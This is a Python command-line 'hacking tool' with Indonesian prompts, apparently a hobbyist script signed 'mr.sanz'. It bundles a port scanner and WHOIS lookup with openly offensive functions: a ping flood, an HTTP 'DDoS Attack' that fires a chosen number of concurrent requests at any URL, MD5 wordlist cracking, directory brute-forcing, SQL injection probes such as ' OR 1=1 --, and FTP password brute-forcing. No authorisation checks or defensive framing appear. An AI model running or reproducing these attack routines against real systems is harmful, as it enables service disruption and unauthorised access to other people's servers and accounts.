import os
import socket
import threading
import requests
import hashlib
import whois
import ssl
import ftplib
from termcolor import colored
import aiohttp
import asyncio

# Logo untuk Tool
def logo():
    logo_text = """
      ██╗███╗   ██╗ █████╗ ███████╗
      ██║████╗  ██║██╔══██╗██╔════╝
  █████╗██║██╔██╗ ██║███████╗
 ██╔══╝██║██║╚██╗██║╚════██║
 ███████╗██║██║ ╚████║███████║
 ╚══════╝╚═╝╚═╝  ╚═══╝╚══════╝
     mr.sanz
    """
    print(colored(logo_text, 'cyan'))

# Port Scanner
def port_scanner(target, ports):
    print(f"\n[*] Start scanning {target}...")
    for port in ports:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        socket.setdefaulttimeout(1)
        result = sock.connect_ex((target, port))
        if result == 0:
            print(f"[+] Port {port} is open")
        else:
            print(f"[-] Port {port} is closed")
        sock.close()

# Ping Flood
def ping_flood(target):
    print(f"\n[*] Starting ping flood on {target}...")
    while True:
        response = os.system(f"ping -c 1 {target}")
        if response == 0:
            print(f"Ping to {target} successful.")
        else:
            print(f"Ping to {target} failed.")

# Hash Cracker (brute-force)
def hash_cracker():
    hash_to_crack = input("Masukkan hash yang ingin di-crack: ")
    wordlist = input("Masukkan path ke wordlist: ")
    
    with open(wordlist, 'r') as file:
        for line in file:
            line = line.strip()
            hashed = hashlib.md5(line.encode()).hexdigest()
            if hashed == hash_to_crack:
                print(f"Hash ditemukan! Password: {line}")
                return
    print("Password tidak ditemukan dalam wordlist.")

# Directory Brute Force
def directory_bruteforce(url, wordlist):
    print(f"\n[*] Mulai brute force direktori di {url}...")
    with open(wordlist, 'r') as file:
        for line in file:
            line = line.strip()
            target_url = f"{url}/{line}"
            response = requests.get(target_url)
            if response.status_code == 200:
                print(f"[+] Ditemukan direktori: {target_url}")
            else:
                print(f"[-] Tidak ditemukan: {target_url}")

# DDoS Attack (aiohttp)
async def send_request(session, url):
    try:
        async with session.get(url) as response:
            print(f"Sent request to {url}, Status Code: {response.status}")
    except Exception as e:
        print(f"Error: {e}")

async def ddos_attack(url, num_requests):
    async with aiohttp.ClientSession() as session:
        tasks = []
        for _ in range(num_requests):
            task = asyncio.ensure_future(send_request(session, url))
            tasks.append(task)
        await asyncio.gather(*tasks)

# SQL Injection Scanner
def sql_injection_scan(url):
    print(f"\n[*] Scanning {url} for SQL Injection vulnerabilities...")
    test_payloads = ["' OR 1=1 --", '" OR 1=1 --', "' UNION SELECT null, null --"]
    for payload in test_payloads:
        test_url = f"{url}{payload}"
        response = requests.get(test_url)
        if "error" in response.text.lower() or "mysql" in response.text.lower():
            print(f"[+] Possible SQL Injection vulnerability found at {test_url}")
        else:
            print(f"[-] No vulnerability found at {test_url}")

# Whois Lookup
def whois_lookup(domain):
    print(f"\n[*] Performing WHOIS lookup for {domain}...")
    try:
        w = whois.whois(domain)
        print(w)
    except Exception as e:
        print(f"Error: {e}")

# Reverse DNS Lookup
def reverse_dns_lookup(ip):
    print(f"\n[*] Performing reverse DNS lookup for {ip}...")
    try:
        host = socket.gethostbyaddr(ip)
        print(f"Host: {host}")
    except socket.herror:
        print(f"[-] No PTR record found for {ip}")

# Brute Force FTP Login
def brute_force_ftp(ip, wordlist):
    print(f"\n[*] Starting FTP brute-force attack on {ip}...")
    try:
        with ftplib.FTP(ip) as ftp:
            with open(wordlist, 'r') as file:
                for line in file:
                    line = line.strip()
                    try:
                        ftp.login(user='anonymous', passwd=line)
                        print(f"[+] Found password: {line}")
                        return
                    except ftplib.error_perm:
                        pass
            print("[-] No valid credentials found.")
    except Exception as e:
        print(f"Error: {e}")

# SSL/TLS Scanner
def ssl_tls_scanner(url):
    print(f"\n[*] Scanning SSL/TLS for {url}...")
    try:
        context = ssl.create_default_context()
        connection = context.wrap_socket(socket.socket(socket.AF_INET), server_hostname=url)
        connection.connect((url, 443))
        print(f"[+] SSL/TLS is enabled for {url}")
    except Exception as e:
        print(f"[-] SSL/TLS not enabled for {url}. Error: {e}")

# Menu utama
def main():
    while True:
        logo()
        print("[1] Port Scanner")
        print("[2] Ping Flood")
        print("[3] Hash Cracker")
        print("[4] Directory Brute Force")
        print("[5] DDoS Attack")
        print("[6] SQL Injection Scanner")
        print("[7] Whois Lookup")
        print("[8] Reverse DNS Lookup")
        print("[9] Brute Force FTP Login")
        print("[10] SSL/TLS Scanner")
        print("[11] Exit")
        
        choice = input("Pilih opsi (1-11): ")
        
        if choice == "1":
            target = input("Masukkan IP/hostname target: ")
            ports = input("Masukkan daftar port (misalnya: 80,443,22): ").split(',')
            ports = [int(port) for port in ports]
            port_scanner(target, ports)

        elif choice == "2":
            target = input("Masukkan IP/hostname target: ")
            ping_flood(target)

        elif choice == "3":
            hash_cracker()

        elif choice == "4":
            url = input("Masukkan URL target (contoh: http://localhost): ")
            wordlist = input("Masukkan path ke wordlist: ")
            directory_bruteforce(url, wordlist)

        elif choice == "5":
            target_url = input("Masukkan URL target untuk DDoS: ")
            num_requests = int(input("Masukkan jumlah request: "))
            asyncio.run(ddos_attack(target_url, num_requests))

        elif choice == "6":
            url = input("Masukkan URL untuk SQL Injection scan: ")
            sql_injection_scan(url)

        elif choice == "7":
            domain = input("Masukkan domain untuk WHOIS lookup: ")
            whois_lookup(domain)

        elif choice == "8":
            ip = input("Masukkan IP untuk Reverse DNS lookup: ")
            reverse_dns_lookup(ip)

        elif choice == "9":
            ip = input("Masukkan IP untuk FTP brute-force: ")
            wordlist = input("Masukkan path ke wordlist: ")
            brute_force_ftp(ip, wordlist)

        elif choice == "10":
            url = input("Masukkan URL untuk SSL/TLS scan: ")
            ssl_tls_scanner(url)

        elif choice == "11":
            print("Keluar dari tool...")
            break

        else:
            print("Pilihan tidak valid, coba lagi.")

if __name__ == "__main__":
    main()



